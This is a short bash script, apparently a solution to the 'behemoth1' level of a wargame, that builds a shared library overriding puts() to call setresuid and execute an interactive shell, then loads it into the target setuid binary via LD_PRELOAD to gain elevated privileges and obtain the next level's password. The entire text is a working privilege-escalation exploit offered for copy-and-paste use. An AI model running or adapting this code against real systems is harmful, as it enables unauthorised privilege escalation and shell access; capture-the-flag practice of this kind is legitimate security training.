#!/bin/bash

# Run this on the server to get the password for the next level
# Easiest method is to copy all the lines here then paste into the terminal 

mkdir /tmp/Anidear_behemoth1
cd /tmp/Anidear_behemoth1
echo -e "#include <unistd.h>\nint puts (const char* str){setresuid(geteuid(),geteuid(),geteuid());execlp(\"/bin/bash\",\"sh\",\"-i\",NULL);return 0;}" > libinject.c
gcc -m32 -fPIC -c -o libinject.o libinject.c 
gcc -m32 -shared -Wl,-soname,libinject.so -o libinject.so.1 libinject.o
LD_PRELOAD=./libinject.so.1 /behemoth/behemoth1

#clean up
cd ~
rm -rf /tmp/Anidear_behemoth1
